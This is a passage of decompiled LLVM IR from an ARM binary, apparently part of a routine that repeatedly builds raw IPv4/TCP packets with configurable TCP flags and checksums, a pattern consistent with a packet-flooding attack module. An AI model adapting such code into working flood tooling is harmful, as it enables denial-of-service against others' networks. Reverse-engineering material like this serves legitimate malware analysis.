  %v2_be0c = icmp eq i32 %v0_be0c, 0
  store i1 %v2_be0c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_be0c, label %dec_label_pc_c250, label %dec_label_pc_be24

dec_label_pc_be24:                                ; preds = %dec_label_pc_bdec
  %v3_be2c = mul i32 %v5_bd64, 65536
  %v1_be30 = add i32 %v3_be2c, 2621440
  %v3_be3c = udiv i32 %v1_be30, 65536
  store i32 %v3_be3c, i32* @sl, align 4
  %v3_be40 = urem i32 %v5_bca0, 65536
  store i32 %v3_be40, i32* @r6, align 4
  %v1_be50 = urem i32 %v6_bcd4, 2
  %v1_be54 = urem i32 %v6_bcec, 2
  %v1_be58 = urem i32 %v6_bd04, 2
  store i32 %v6_bd04, i32* %r1.global-to-local, align 4
  %v0_be70 = load i32, i32* @sb, align 4
  %v1_be70 = urem i32 %v0_be70, 2
  %v1_be74 = urem i32 %v6_bd1c, 2
  store i32 %v1_be74, i32* %r2.global-to-local, align 4
  %v1_be78 = urem i32 %v6_bd34, 2
  store i32 %v1_be78, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_be84 = urem i32 %v6_bd04, 256
  store i32 %v1_be84, i32* @sb, align 4
  %v4_bfe0 = sext i8 %v5_bc0c to i32
  %sext = mul i32 %v6_bc28, 16777216
  %v4_bffc = sdiv i32 %sext, 16777216
  %tmp = sub nsw i32 0, %v1_be50
  %v4_bee8 = and i32 %tmp, 32
  %tmp55 = sub nsw i32 0, %v1_be54
  %v4_befc = and i32 %tmp55, 16
  %tmp56 = sub nsw i32 0, %v1_be58
  %v4_bf10 = and i32 %tmp56, 8
  %tmp57 = sub nsw i32 0, %v1_be74
  %v4_bf24 = and i32 %tmp57, 4
  %tmp58 = sub nsw i32 0, %v1_be78
  %v3_bf38 = and i32 %tmp58, 2
  br label %dec_label_pc_bfa0

dec_label_pc_be94:                                ; preds = %dec_label_pc_bfa0, %dec_label_pc_c014
  %v2_be98 = phi i32 [ %v0_c00c, %dec_label_pc_bfa0 ], [ %v2_be98.pre, %dec_label_pc_c014 ]
  %v3_be98 = add i32 %v2_be98, 9
  %v4_be98 = inttoptr i32 %v3_be98 to i8*
  store i8 6, i8* %v4_be98, align 1
  %v3_be9c = load i32, i32* %stack_var_-44, align 4
  %v5_bea4 = mul i32 %v3_be9c, 24
  store i32 %v5_bea4, i32* %r3.global-to-local, align 4
  store i32 %v6_bda0, i32* %r2.global-to-local, align 4
  %v1_beac = load i32, i32* @r5, align 4
  %v2_beac = add i32 %v1_beac, 12
  %v3_beac = inttoptr i32 %v2_beac to i32*
  store i32 %v6_bda0, i32* %v3_beac, align 4
  %v0_beb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_beb0 = load i32, i32* @r8, align 4
  %v2_beb0 = add i32 %v1_beb0, %v0_beb0
  store i32 %v2_beb0, i32* %r3.global-to-local, align 4
  %v1_beb4 = add i32 %v2_beb0, 16
  %v2_beb4 = inttoptr i32 %v1_beb4 to i32*
  %v3_beb4 = load i32, i32* %v2_beb4, align 4
  store i32 %v3_beb4, i32* %r2.global-to-local, align 4
  %v1_bebc = load i32, i32* @r5, align 4
  %v2_bebc = add i32 %v1_bebc, 16
  %v3_bebc = inttoptr i32 %v2_bebc to i32*
  store i32 %v3_beb4, i32* %v3_bebc, align 4
  %v1_bec0 = call i32 @function_1484c(i32 %v3_be04)
  %v2_bec0 = trunc i32 %v1_bec0 to i16
  %v3_bec4 = load i32, i32* @r5, align 4
  %v4_bec4 = add i32 %v3_bec4, 20
  %v5_bec4 = inttoptr i32 %v4_bec4 to i16*
  store i16 %v2_bec0, i16* %v5_bec4, align 2
  %v1_becc = call i32 @function_1484c(i32 %v3_be08)
  %v2_becc = trunc i32 %v1_becc to i16
  %v3_bed0 = load i32, i32* @r4, align 4
  %v4_bed0 = add i32 %v3_bed0, 2
  %v5_bed0 = inttoptr i32 %v4_bed0 to i16*
  store i16 %v2_becc, i16* %v5_bed0, align 2
  %v0_bed4 = load i32, i32* @r6, align 4
  %v1_bed8 = call i32 @function_1484c(i32 %v0_bed4)
  %v0_bedc = load i32, i32* @r4, align 4
  %v1_bedc = add i32 %v0_bedc, 13
  %v2_bedc = inttoptr i32 %v1_bedc to i8*
  %v3_bedc = load i8, i8* %v2_bedc, align 1
  %v4_bedc = zext i8 %v3_bedc to i32
  store i32 %v1_be50, i32* %r1.global-to-local, align 4
  %v1_bee4 = and i32 %v4_bedc, 223
  %v5_bee8 = or i32 %v1_bee4, %v4_bee8
  store i32 %v5_bee8, i32* %r3.global-to-local, align 4
  %v1_beec = trunc i32 %v5_bee8 to i8
  store i8 %v1_beec, i8* %v2_bedc, align 1
  %v0_bef0 = load i32, i32* @r4, align 4
  %v1_bef0 = add i32 %v0_bef0, 13
  %v2_bef0 = inttoptr i32 %v1_bef0 to i8*
  %v3_bef0 = load i8, i8* %v2_bef0, align 1
  %v4_bef0 = zext i8 %v3_bef0 to i32
  store i32 %v1_be54, i32* %r3.global-to-local, align 4
  %v1_bef8 = and i32 %v4_bef0, 239
  %v5_befc = or i32 %v1_bef8, %v4_befc
  store i32 %v5_befc, i32* %r2.global-to-local, align 4
  %v1_bf00 = trunc i32 %v5_befc to i8
  store i8 %v1_bf00, i8* %v2_bef0, align 1
  %v0_bf04 = load i32, i32* @r4, align 4
  %v1_bf04 = add i32 %v0_bf04, 13
  %v2_bf04 = inttoptr i32 %v1_bf04 to i8*
  %v3_bf04 = load i8, i8* %v2_bf04, align 1
  %v4_bf04 = zext i8 %v3_bf04 to i32
  store i32 %v1_be58, i32* %r1.global-to-local, align 4
  %v1_bf0c = and i32 %v4_bf04, 247
  %v5_bf10 = or i32 %v1_bf0c, %v4_bf10
  store i32 %v5_bf10, i32* %r3.global-to-local, align 4
  %v1_bf14 = trunc i32 %v5_bf10 to i8
  store i8 %v1_bf14, i8* %v2_bf04, align 1
  %v0_bf18 = load i32, i32* @r4, align 4
  %v1_bf18 = add i32 %v0_bf18, 13
  %v2_bf18 = inttoptr i32 %v1_bf18 to i8*
  %v3_bf18 = load i8, i8* %v2_bf18, align 1
  %v4_bf18 = zext i8 %v3_bf18 to i32
  store i32 %v1_be74, i32* %r3.global-to-local, align 4
  %v1_bf20 = and i32 %v4_bf18, 251
  %v5_bf24 = or i32 %v1_bf20, %v4_bf24
  store i32 %v5_bf24, i32* %r2.global-to-local, align 4
  %v1_bf28 = trunc i32 %v5_bf24 to i8
  store i8 %v1_bf28, i8* %v2_bf18, align 1
  %v0_bf2c = load i32, i32* @r4, align 4
  %v1_bf2c = add i32 %v0_bf2c, 13
  %v2_bf2c = inttoptr i32 %v1_bf2c to i8*
  %v3_bf2c = load i8, i8* %v2_bf2c, align 1
  %v4_bf2c = zext i8 %v3_bf2c to i32
  store i32 %v1_be78, i32* %r1.global-to-local, align 4
  %v1_bf34 = and i32 %v4_bf2c, 253
  %v4_bf38 = or i32 %v1_bf34, %v3_bf38
  store i32 %v4_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = trunc i32 %v4_bf38 to i8
  store i8 %v1_bf3c, i8* %v2_bf2c, align 1
  %v0_bf40 = load i32, i32* @r4, align 4
  %v1_bf40 = add i32 %v0_bf40, 12
  %v2_bf40 = inttoptr i32 %v1_bf40 to i8*
  %v3_bf40 = load i8, i8* %v2_bf40, align 1
  %v4_bf40 = zext i8 %v3_bf40 to i32
  store i32 %v4_bf40, i32* %r2.global-to-local, align 4
  %v1_bf44 = add i32 %v0_bf40, 13
  %v2_bf44 = inttoptr i32 %v1_bf44 to i8*
  %v3_bf44 = load i8, i8* %v2_bf44, align 1
  %v4_bf44 = zext i8 %v3_bf44 to i32
  store i32 %v1_be70, i32* %r1.global-to-local, align 4
  %tmp59 = urem i8 %v3_bf40, 16
  %v1_bf4c = zext i8 %tmp59 to i32
  %v1_bf50 = and i32 %v4_bf44, 254
  %v2_bf54 = or i32 %v1_bf50, %v1_be70
  store i32 %v2_bf54, i32* %r3.global-to-local, align 4
  %v1_bf58 = or i32 %v1_bf4c, 80
  store i32 %v1_bf58, i32* %r2.global-to-local, align 4
  %v1_bf5c = trunc i32 %v2_bf54 to i8
  store i8 %v1_bf5c, i8* %v2_bf44, align 1
  %v0_bf60 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf60 = trunc i32 %v0_bf60 to i8
  %v2_bf60 = load i32, i32* @r4, align 4
  %v3_bf60 = add i32 %v2_bf60, 12
  %v4_bf60 = inttoptr i32 %v3_bf60 to i8*
  store i8 %v1_bf60, i8* %v4_bf60, align 1
  %v1_bf64 = load i32, i32* @r4, align 4
  %v2_bf64 = add i32 %v1_bf64, 4
  %v3_bf64 = inttoptr i32 %v2_bf64 to i32*
  store i32 %v1_bed8, i32* %v3_bf64, align 4
  %v0_bf68 = call i32 @function_f570()
  %v1_bf68 = trunc i32 %v0_bf68 to i16
  %v0_bf6c = load i32, i32* @sb, align 4
  %v2_bf6c = icmp eq i32 %v0_bf6c, 0
  store i1 %v2_bf6c, i1* %cpsr_z.global-to-local, align 1
  %v3_bf78.pre = load i32, i32* @r4, align 4
  br i1 %v2_bf6c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_be94
  %v2_bf70 = add i32 %v3_bf78.pre, 13
  %v3_bf70 = inttoptr i32 %v2_bf70 to i8*
  %v4_bf70 = load i8, i8* %v3_bf70, align 1
  %v5_bf70 = zext i8 %v4_bf70 to i32
  %v2_bf74 = or i32 %v5_bf70, 8
  store i32 %v2_bf74, i32* @r3, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_be94, %bb
  %v4_bf78 = add i32 %v3_bf78.pre, 14
  %v5_bf78 = inttoptr i32 %v4_bf78 to i16*
  store i16 %v1_bf68, i16* %v5_bf78, align 2
  store i32 %v5_bd64, i32* %r1.global-to-local, align 4
  %v0_bf80 = load i32, i32* @r5, align 4
  %v1_bf80 = add i32 %v0_bf80, 40
  br i1 %v2_bf6c, label %bb54, label %bb53

bb53:                                             ; preds = %.thread
  %v1_bf84 = load i32, i32* @r3, align 4
  %v2_bf84 = trunc i32 %v1_bf84 to i8
  %v3_bf84 = load i32, i32* @r4, align 4
  %v4_bf84 = add i32 %v3_bf84, 13
  %v5_bf84 = inttoptr i32 %v4_bf84 to i8*
  store i8 %v2_bf84, i8* %v5_bf84, align 1
  br label %bb54

bb54:                                             ; preds = %.thread, %bb53
  %v2_bf88 = inttoptr i32 %v1_bf80 to i16*
  %v3_bf88 = call i32 @function_f770(i16* %v2_bf88, i32 %v5_bd64)
  %v3_bf8c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf8c, i32* %r3.global-to-local, align 4
  %v1_bf90 = add i32 %v3_bf8c, 1
  store i32 %v1_bf90, i32* @r4, align 4
  %v1_bf94 = load i32, i32* @r7, align 4
  %v9_bf94 = icmp eq i32 %v1_bf90, %v1_bf94
  store i1 %v9_bf94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bf90, i32* %stack_var_-44, align 4
  %v6_bf9c = icmp slt i32 %v1_bf90, %v1_bf94
  br i1 %v6_bf9c, label %dec_label_pc_bfa0, label %dec_label_pc_c038

dec_label_pc_bfa0:                                ; preds = %bb54, %dec_label_pc_be24
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_bfac = call i32 @function_1320c(i32 1510, i32 1)
  store i32 %v2_bbd4, i32* %r2.global-to-local, align 4
  %v3_bfb4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bfb4, i32* %r3.global-to-local, align 4
  %v2_bfb8 = load i32, i32* @r4, align 4
  %v5_bfb8 = mul i32 %v2_bfb8, 4
  %v6_bfb8 = add i32 %v5_bfb8, %v2_bbd4
  %v7_bfb8 = inttoptr i32 %v6_bfb8 to i32*
  store i32 %v2_bfac, i32* %v7_bfb8, align 4
  %v0_bfbc = load i32, i32* %r2.global-to-local, align 4
  %v1_bfbc = load i32, i32* %r3.global-to-local, align 4
  %v4_bfbc = mul i32 %v1_bfbc, 4
  %v5_bfbc = add i32 %v4_bfbc, %v0_bfbc
  %v6_bfbc = inttoptr i32 %v5_bfbc to i32*
  %v7_bfbc = load i32, i32* %v6_bfbc, align 4
  store i32 %v7_bfbc, i32* @r5, align 4
  %v1_bfc0 = inttoptr i32 %v7_bfbc to i8*
  %v2_bfc0 = load i8, i8* %v1_bfc0, align 1
  %tmp60 = urem i8 %v2_bfc0, 16
  %v1_bfc4 = zext i8 %tmp60 to i32
  %v1_bfc8 = or i32 %v1_bfc4, 64
  store i32 %v1_bfc8, i32* %r2.global-to-local, align 4
  %v1_bfcc = trunc i32 %v1_bfc8 to i8
  store i8 %v1_bfcc, i8* %v1_bfc0, align 1
  %v0_bfd0 = load i32, i32* @r5, align 4
  %v1_bfd0 = inttoptr i32 %v0_bfd0 to i8*
  %v2_bfd0 = load i8, i8* %v1_bfd0, align 1
  %v1_bfd4 = and i8 %v2_bfd0, -16
  %v1_bfd8 = or i8 %v1_bfd4, 5
  store i8 %v1_bfd8, i8* %v1_bfd0, align 1
  store i32 %v4_bfe0, i32* %r3.global-to-local, align 4
  %v0_bfe4 = load i32, i32* @sl, align 4
  %v2_bfe8 = load i32, i32* @r5, align 4
  %v3_bfe8 = add i32 %v2_bfe8, 1
  %v4_bfe8 = inttoptr i32 %v3_bfe8 to i8*
  store i8 %v5_bc0c, i8* %v4_bfe8, align 1
  %v1_bfec = call i32 @function_1484c(i32 %v0_bfe4)
  %v2_bfec = trunc i32 %v1_bfec to i16
  %v3_bff0 = load i32, i32* @r5, align 4
  %v4_bff0 = add i32 %v3_bff0, 2
  %v5_bff0 = inttoptr i32 %v4_bff0 to i16*
  store i16 %v2_bfec, i16* %v5_bff0, align 2
  %v1_bff8 = call i32 @function_1484c(i32 %v3_be00)
  %v2_bff8 = trunc i32 %v1_bff8 to i16
  store i32 %v4_bffc, i32* %r1.global-to-local, align 4
  %v0_c000 = load i32, i32* @fp, align 4
  %v2_c000 = icmp eq i32 %v0_c000, 0
  store i1 %v2_c000, i1* %cpsr_z.global-to-local, align 1
  %v3_c004 = load i32, i32* @r5, align 4
  %v4_c004 = add i32 %v3_c004, 4
  %v5_c004 = inttoptr i32 %v4_c004 to i16*
  store i16 %v2_bff8, i16* %v5_c004, align 2
  %v0_c008 = load i32, i32* %r1.global-to-local, align 4
  %v1_c008 = trunc i32 %v0_c008 to i8
  %v2_c008 = load i32, i32* @r5, align 4
  %v3_c008 = add i32 %v2_c008, 8
  %v4_c008 = inttoptr i32 %v3_c008 to i8*
  store i8 %v1_c008, i8* %v4_c008, align 1
  %v0_c00c = load i32, i32* @r5, align 4
  %v1_c00c = add i32 %v0_c00c, 20
  store i32 %v1_c00c, i32* @r4, align 4
  %v0_c010 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c010, label %dec_label_pc_be94, label %dec_label_pc_c014

dec_label_pc_c014:                                ; preds = %dec_label_pc_bfa0
  %v1_c018 = call i32 @function_1484c(i32 16384)
  %v2_c018 = trunc i32 %v1_c018 to i16
  %v3_c01c = load i32, i32* @r5, align 4
  %v4_c01c = add i32 %v3_c01c, 6
  %v5_c01c = inttoptr i32 %v4_c01c to i16*
  store i16 %v2_c018, i16* %v5_c01c, align 2
  %v2_be98.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_be94

dec_label_pc_c024:                                ; preds = %dec_label_pc_bdc4
  store i32 %v3_bdb4, i32* @r0, align 4
  %v1_c028 = call i32 @function_15b20(i32 %v3_bdb4)
  br label %dec_label_pc_c02c

dec_label_pc_c02c:                                ; preds = %dec_label_pc_bbb8, %dec_label_pc_c024
  %v1_c034 = phi i32 [ %v3_bdb4, %dec_label_pc_bbb8 ], [ %v1_c028, %dec_label_pc_c024 ]
  store i32 %v3_bbb8, i32* %r4.global-to-local, align 4
  store i32 %v18_bbb8, i32* %sb.global-to-local, align 4
  store i32 %v24_bbb8, i32* %fp.global-to-local, align 4
  store i32 %v27_bbb8, i32* %lr.global-to-local, align 4
  ret i32 %v1_c034

dec_label_pc_c038:                                ; preds = %bb54
  store i32 %v5_bd64, i32* %r2.global-to-local, align 4
  %v1_c03c = add i32 %v5_bd64, 20
  store i32 %v1_c03c, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_c044

dec_label_pc_c044:                                ; preds = %dec_label_pc_c250, %dec_label_pc_c038
  %v0_c0546 = phi i32 [ %v1_bf94, %dec_label_pc_c038 ], [ 0, %dec_label_pc_c250 ]
  %stack_var_-148.0 = phi i32 [ %v3_be2c, %dec_label_pc_c038 ], [ %v3_c25c, %dec_label_pc_c250 ]
  %storemerge = add i32 %v5_bd64, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-148.0, i32* %r2.global-to-local, align 4
  %v1_c048 = add i32 %stack_var_-148.0, 1310720
  store i32 %v1_c048, i32* %r3.global-to-local, align 4
  %v3_c04c = udiv i32 %v1_c048, 65536
  store i32 %v3_c04c, i32* @sl, align 4
  %v3_c1b4 = icmp eq i32 %v6_bda0, -1
  %v8_c1b4 = icmp eq i32 %v6_bda0, -1
  %v3_c1d0 = icmp eq i32 %v3_be00, 65535
  %v2_c234 = icmp eq i32 %v1_bd8c, 0
  br label %dec_label_pc_c050

dec_label_pc_c050:                                ; preds = %dec_label_pc_c050, %dec_label_pc_c170, %dec_label_pc_c044
  %v0_c054 = phi i32 [ %v0_c0546, %dec_label_pc_c044 ], [ 0, %dec_label_pc_c170 ], [ 0, %dec_label_pc_c050 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c054 = icmp eq i32 %v0_c054, 0
  store i1 %v2_c054, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c054, label %dec_label_pc_c050, label %dec_label_pc_c060

dec_label_pc_c060:                                ; preds = %dec_label_pc_c050, %dec_label_pc_c170
  br label %dec_label_pc_c064

dec_label_pc_c064:                                ; preds = %dec_label_pc_c0e4, %dec_label_pc_c060
  %v1_c078 = phi i32 [ %v1_c160, %dec_label_pc_c0e4 ], [ 0, %dec_label_pc_c060 ]
  %v5_c068 = mul i32 %v1_c078, 24
  %v1_c06c = load i32, i32* @r8, align 4
  %v2_c06c = add i32 %v1_c06c, %v5_c068
  store i32 %v2_c06c, i32* %r3.global-to-local, align 4
  store i32 %v2_bbd4, i32* %r1.global-to-local, align 4
  %v1_c074 = add i32 %v2_c06c, 20
  %v2_c074 = inttoptr i32 %v1_c074 to i8*
  %v3_c074 = load i8, i8* %v2_c074, align 1
  %v4_c074 = zext i8 %v3_c074 to i32
  store i32 %v4_c074, i32* %r2.global-to-local, align 4
  %v4_c078 = mul i32 %v1_c078, 4
  %v5_c078 = add i32 %v4_c078, %v2_bbd4
  %v6_c078 = inttoptr i32 %v5_c078 to i32*
  %v7_c078 = load i32, i32* %v6_c078, align 4
  store i32 %v7_c078, i32* @r5, align 4
  %v7_c07c = icmp eq i8 %v3_c074, 31
  store i1 %v7_c07c, i1* %cpsr_z.global-to-local, align 1
  %v1_c080 = add i32 %v7_c078, 20
  store i32 %v1_c080, i32* @r6, align 4
  %tmp61 = icmp ult i8 %v3_c074, 32
  br i1 %tmp61, label %dec_label_pc_c184, label %dec_label_pc_c088

dec_label_pc_c088:                                ; preds = %dec_label_pc_c064
  store i32 %v6_bda0, i32* %r2.global-to-local, align 4
  store i1 %v8_c1b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c1b4, label %dec_label_pc_c1c0, label %dec_label_pc_c094

dec_label_pc_c094:                                ; preds = %dec_label_pc_c184, %dec_label_pc_c088
  store i32 %v3_be00, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c1d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c1d0, label %dec_label_pc_c1dc, label %dec_label_pc_c0a8

dec_label_pc_c0a8:                                ; preds = %dec_label_pc_c1c0.dec_label_pc_c0a8_crit_edge, %dec_label_pc_c094
  %v1_c0ac = phi i32 [ %v1_c0ac.pre, %dec_label_pc_c1c0.dec_label_pc_c0a8_crit_edge ], [ 65535, %dec_label_pc_c094 ]
  store i32 %v3_be04, i32* %r1.global-to-local, align 4
  %v9_c0ac = icmp eq i32 %v3_be04, %v1_c0ac
  store i1 %v9_c0ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0ac, label %dec_label_pc_c1f0, label %dec_label_pc_c0b4

dec_label_pc_c0b4:                                ; preds = %dec_label_pc_c1dc.dec_label_pc_c0b4_crit_edge, %dec_label_pc_c0a8
  %v1_c0b8 = phi i32 [ %v1_c0b8.pre, %dec_label_pc_c1dc.dec_label_pc_c0b4_crit_edge ], [ %v1_c0ac, %dec_label_pc_c0a8 ]
  store i32 %v3_be08, i32* %r2.global-to-local, align 4
  %v9_c0b8 = icmp eq i32 %v3_be08, %v1_c0b8
  store i1 %v9_c0b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0b8, label %dec_label_pc_c204, label %dec_label_pc_c0c0

dec_label_pc_c0c0:                                ; preds = %dec_label_pc_c1f0.dec_label_pc_c0c0_crit_edge, %dec_label_pc_c0b4
  %v1_c0c4 = phi i32 [ %v1_c0c4.pre, %dec_label_pc_c1f0.dec_label_pc_c0c0_crit_edge ], [ %v1_c0b8, %dec_label_pc_c0b4 ]
  store i32 %v5_bca0, i32* %r3.global-to-local, align 4
  %v9_c0c4 = icmp eq i32 %v5_bca0, %v1_c0c4
  store i1 %v9_c0c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0c4, label %dec_label_pc_c218, label %dec_label_pc_c0cc

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c204.dec_label_pc_c0cc_crit_edge, %dec_label_pc_c0c0
  %v1_c0d0 = phi i32 [ %v1_c0d0.pre, %dec_label_pc_c204.dec_label_pc_c0cc_crit_edge ], [ %v1_c0c4, %dec_label_pc_c0c0 ]
  store i32 %v6_bcbc, i32* %r1.global-to-local, align 4
  %v9_c0d0 = icmp eq i32 %v6_bcbc, %v1_c0d0
  store i1 %v9_c0d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0d0, label %dec_label_pc_c22c, label %dec_label_pc_c0d8

dec_label_pc_c0d8:                                ; preds = %dec_label_pc_c218, %dec_label_pc_c0cc
  store i32 %v1_bd8c, i32* %r2.global-to-local, align 4
  store i1 %v2_c234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c234, label %dec_label_pc_c0e4, label %dec_label_pc_c240

dec_label_pc_c0e4:                                ; preds = %dec_label_pc_c0d8, %dec_label_pc_c22c, %dec_label_pc_c240
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c0e8 = load i32, i32* @r5, align 4
  %v3_c0e8 = add i32 %v2_c0e8, 10
  %v4_c0e8 = inttoptr i32 %v3_c0e8 to i16*
  store i16 0, i16* %v4_c0e8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c0f0 = load i32, i32* @r5, align 4
  store i32 %v0_c0f0, i32* @r0, align 4
  %v2_c0f4 = call i32 @function_dadc(i32 %v0_c0f0, i32 20)
  %v3_c0f4 = trunc i32 %v2_c0f4 to i16
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_c0fc = load i32, i32* @r5, align 4
  %v4_c0fc = add i32 %v3_c0fc, 10
  %v5_c0fc = inttoptr i32 %v4_c0fc to i16*
  store i16 %v3_c0f4, i16* %v5_c0fc, align 2
  %v0_c100 = load i32, i32* %r1.global-to-local, align 4
  %v1_c100 = trunc i32 %v0_c100 to i16
  %v2_c100 = load i32, i32* @r6, align 4
  %v3_c100 = add i32 %v2_c100, 16
  %v4_c100 = inttoptr i32 %v3_c100 to i16*
  store i16 %v1_c100, i16* %v4_c100, align 2
  %v0_c104 = load i32, i32* @sl, align 4
  %v1_c108 = call i32 @function_1484c(i32 %v0_c104)
  %v0_c10c = load i32, i32* @r6, align 4
  store i32 %v0_c10c, i32* @r1, align 4
  store i32 %v1_c108, i32* %r2.global-to-local, align 4
  %v0_c114 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_c114, i32* %r3.global-to-local, align 4
  %v0_c118 = load i32, i32* @r5, align 4
  %v4_c11c = call i32 @function_db2c(i32 %v0_c118, i32 %v0_c10c, i32 %v1_c108, i32 %v0_c114)
  %v5_c11c = trunc i32 %v4_c11c to i16
  %v3_c120 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c120, i32* %r3.global-to-local, align 4
  %v3_c124 = mul i32 %v3_c120, 32
  store i32 %v3_c124, i32* %lr.global-to-local, align 4
  %v3_c128 = load i32, i32* @r6, align 4
  %v4_c128 = add i32 %v3_c128, 16
  %v5_c128 = inttoptr i32 %v4_c128 to i16*
  store i16 %v5_c11c, i16* %v5_c128, align 2
  %v0_c12c = load i32, i32* %lr.global-to-local, align 4
  %v1_c12c = load i32, i32* %r3.global-to-local, align 4
  %tmp62 = mul i32 %v1_c12c, -8
  %v5_c12c = add i32 %v0_c12c, %tmp62
  store i32 %v5_c12c, i32* %lr.global-to-local, align 4
  %v0_c130 = load i32, i32* @r6, align 4
  %v1_c130 = add i32 %v0_c130, 2
  %v2_c130 = inttoptr i32 %v1_c130 to i16*
  %v3_c130 = load i16, i16* %v2_c130, align 2
  %v1_c134 = load i32, i32* @r8, align 4
  %v2_c134 = add i32 %v1_c134, %v5_c12c
  store i32 %v2_c134, i32* @lr, align 4
  %v3_c138 = add i32 %v2_c134, 2
  %v4_c138 = inttoptr i32 %v3_c138 to i16*
  store i16 %v3_c130, i16* %v4_c138, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c144 = load i32, i32* @r5, align 4
  store i32 %v0_c144, i32* @r1, align 4
  store i32 %v3_bdb4, i32* @r0, align 4
  %v0_c14c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c14c, i32* @r2, align 4
  %v0_c158 = call i32 @function_14a98()
  %v3_c15c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c15c, i32* %r3.global-to-local, align 4
  %v1_c160 = add i32 %v3_c15c, 1
  %v1_c164 = load i32, i32* @r7, align 4
  %v9_c164 = icmp eq i32 %v1_c160, %v1_c164
  store i1 %v9_c164, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c160, i32* %stack_var_-44, align 4
  %v5_c16c = icmp slt i32 %v1_c160, %v1_c164
  br i1 %v5_c16c, label %dec_label_pc_c064, label %dec_label_pc_c170

dec_label_pc_c170:                                ; preds = %dec_label_pc_c0e4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c174 = icmp eq i32 %v1_c164, 0
  store i1 %v2_c174, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c174, label %dec_label_pc_c050, label %dec_label_pc_c060

dec_label_pc_c184:                                ; preds = %dec_label_pc_c064
  %v1_c184 = add i32 %v2_c06c, 16
  %v2_c184 = inttoptr i32 %v1_c184 to i32*
  %v3_c184 = load i32, i32* %v2_c184, align 4
  %v1_c188 = call i32 @function_149d0(i32 %v3_c184)
  store i32 %v1_c188, i32* %r4.global-to-local, align 4
  %v0_c190 = call i32 @function_f570()
  %v3_c194 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c194, i32* %r2.global-to-local, align 4
  %v5_c19c = mul i32 %v3_c194, 24
  %v1_c1a0 = load i32, i32* @r8, align 4
  %v2_c1a0 = add i32 %v1_c1a0, %v5_c19c
  store i32 %v2_c1a0, i32* %r3.global-to-local, align 4
  %v1_c1a4 = add i32 %v2_c1a0, 20
  %v2_c1a4 = inttoptr i32 %v1_c1a4 to i8*
  %v3_c1a4 = load i8, i8* %v2_c1a4, align 1
  %v4_c1a4 = zext i8 %v3_c1a4 to i32
  store i32 %v4_c1a4, i32* %r2.global-to-local, align 4
  %v0_c1a8 = load i32, i32* %r4.global-to-local, align 4
  %v7_c1a8 = lshr i32 %v0_c190, %v4_c1a4
  %v8_c1a8 = add i32 %v7_c1a8, %v0_c1a8
  %v1_c1ac = call i32 @function_14828(i32 %v8_c1a8)
  store i32 %v6_bda0, i32* %r2.global-to-local, align 4
  store i1 %v8_c1b4, i1* %cpsr_z.global-to-local, align 1
  %v1_c1b8 = load i32, i32* @r5, align 4
  %v2_c1b8 = add i32 %v1_c1b8, 16
  %v3_c1b8 = inttoptr i32 %v2_c1b8 to i32*
  store i32 %v1_c1ac, i32* %v3_c1b8, align 4
  br i1 %v3_c1b4, label %dec_label_pc_c1c0, label %dec_label_pc_c094

dec_label_pc_c1c0:                                ; preds = %dec_label_pc_c184, %dec_label_pc_c088
  %v0_c1c0 = call i32 @function_f570()
  store i32 %v3_be00, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c1d0, i1* %cpsr_z.global-to-local, align 1
  %v1_c1d4 = load i32, i32* @r5, align 4
  %v2_c1d4 = add i32 %v1_c1d4, 12
  %v3_c1d4 = inttoptr i32 %v2_c1d4 to i32*
  store i32 %v0_c1c0, i32* %v3_c1d4, align 4
  br i1 %v3_c1d0, label %dec_label_pc_c1dc, label %dec_label_pc_c1c0.dec_label_pc_c0a8_crit_edge

dec_label_pc_c1c0.dec_label_pc_c0a8_crit_edge:    ; preds = %dec_label_pc_c1c0
  %v1_c0ac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0a8

dec_label_pc_c1dc:                                ; preds = %dec_label_pc_c1c0, %dec_label_pc_c094
  %v0_c1dc = call i32 @function_f570()
  %v1_c1dc = trunc i32 %v0_c1dc to i16
  store i32 %v3_be04, i32* %r1.global-to-local, align 4
  %v1_c1e4 = load i32, i32* @r4, align 4
